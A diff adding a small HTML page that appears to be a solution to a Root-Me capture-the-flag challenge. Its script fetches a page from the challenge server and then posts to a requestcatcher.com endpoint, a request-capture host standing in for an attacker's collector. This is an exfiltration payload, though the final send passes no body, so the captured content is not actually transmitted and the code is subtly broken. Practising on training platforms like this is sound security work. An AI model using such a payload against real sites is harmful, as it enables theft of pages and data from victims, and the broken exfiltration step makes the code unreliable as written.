@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title></title>
+  </head>
+  <body>
+    <script>
+      let xhttp = new XMLHttpRequest();
+      xhttp.open(
+        "GET",
+        "http://challenge01.root-me.org:58005/?style=light",
+        false,
+      );
+      xhttp.send();
+
+      html = xhttp.responseText;
+
+      xhttp = new XMLHttpRequest();
+      xhttp.open("POST", "https://toto.requestcatcher.com/html", false);
+      xhttp.send();
+    </script>
+  </body>
+</html>
